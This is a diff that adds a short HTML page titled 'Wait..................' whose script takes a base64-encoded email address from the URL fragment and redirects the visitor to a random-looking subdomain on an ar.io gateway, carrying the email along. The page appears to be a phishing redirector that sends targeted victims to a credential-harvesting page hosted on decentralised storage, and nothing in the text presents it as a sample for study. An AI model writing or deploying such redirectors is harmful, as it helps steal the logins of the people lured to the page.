@@ -1,0 +1,19 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Wait..................</title>
+</head>
+<body>
+<script>
+  var base64email = window.location.hash.substring(1); // Get the hash (remove the '#' character)
+
+  if (base64email) {
+    // Redirect to the URL with the base64-encoded email as the hash
+    window.location.href = "https://hr2etlpfkdk3gvng2hkjbbzyl5a4loc7nyahchitstmfhn765oya.ar.io/PHRJreVQ1bNVptHUkIc4X0HFuF9uAHEdE5TYU7f-67A/#" + base64email;
+  } else {
+    console.error("No base64-encoded email found in the URL hash.");
+  }
+</script>
+</body>
+</html>
